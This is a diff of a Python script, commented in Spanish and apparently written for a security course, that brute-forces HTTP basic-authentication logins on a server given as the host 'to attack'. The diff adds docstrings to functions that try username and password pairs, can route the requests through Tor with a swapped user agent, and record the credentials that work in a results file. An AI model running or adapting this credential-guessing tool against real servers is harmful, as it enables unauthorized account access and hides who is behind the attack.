@@ -23,12 +23,22 @@ from requests.exceptions import ConnectionError
 
 
 def printError(msg, exit = False):
+    '''
+        Función para imprimir en la salida error estándar y terminar la ejecución
+        Recibe:
+        mensaje de error, true si se quiere terminar la ejecución del programa 
+    '''
         sys.stderr.write('Error:\t%s\n' % msg)
         if exit:
             sys.exit(1)
 
 
 def addOptions():
+    '''
+        Función para las opciones que recibirá el programa al momento de ejecutarse
+        Retorna:
+        Las opciones que se pusieron
+    '''
     parser = optparse.OptionParser()
     parser.add_option('-p','--port', dest='port', default='80', help='Port that the HTTP server is listening to.')
     parser.add_option('-s','--server', dest='server', default=None, help='Host that will be attacked.')
@@ -43,11 +53,20 @@ def addOptions():
    
 
 def checkOptions(options):
+    '''
+        Función para checar si las opciones requeridas se pusieron para poder ejecutar el programa
+    '''
     if options.server is None:
         printError('Debes especificar un servidor a atacar.', True)
 
 
 def reportResults(archivo,resultados):
+    '''
+        Función para escribir en un archivo los resultados obtenidos
+        Recibe:
+            el nombre del archivo donde se escribirá
+            lista de resultados para escribirlos en el archivo
+    '''
     with open(archivo,"w") as file:
         file.write("Resultados de usuarios y contraseñas utilizados\n\n")
         for res in resultados:
@@ -56,11 +75,28 @@ def reportResults(archivo,resultados):
 
 
 def buildURL(server,port, protocol = 'http'):
+    '''
+        Función para crear la url a partir del puerto, servidor y protocolo
+        Recibe:
+            servidor, puerto y por omisión el protocolo
+        Retorna:
+            url ya creada
+    '''
     url = '%s://%s:%s' % (protocol,server,port)
     return url
 
 
 def makeRequest(host, user, password):
+    '''
+        Función para hacer la petición a un servidor
+        Recibe:
+            host, que es la url
+            user que es el usuario para autenticarnos
+            password que es la contraseña para autenticarnos
+        Retorna:
+            True si la coneccion fue correcta
+            False si por algún motivo no pudo hacer la conexión
+    '''
     try:
         response = req.get(host, auth=(user,password))
         # print response
@@ -76,6 +112,14 @@ def makeRequest(host, user, password):
 
 
 def Tor(host,user,password,agente=False):
+    '''
+        Función para mandar el tráfico por Tor
+        Recibe:
+            host, que es la url
+            user para autenticarnos
+            password para autenticarnos
+            agente por si quieremos cambiar el agente de usuario, en caso de no requerirlo por defecto tendrá un False
+    '''
     sesion = req.session()
     sesion.proxies = {'http':'socks5://127.0.0.1:9050','https':'socks5://127.0.0.1:9050'}
     try:
@@ -85,7 +129,6 @@ def Tor(host,user,password,agente=False):
         else:
             response = sesion.get(host, auth=(user,password))
         #print response
-        #print dir(response)
         if response.status_code == 200:
             # print 'CREDENCIALES ENCONTRADAS!: %s\t%s' % (user,password)
             return True
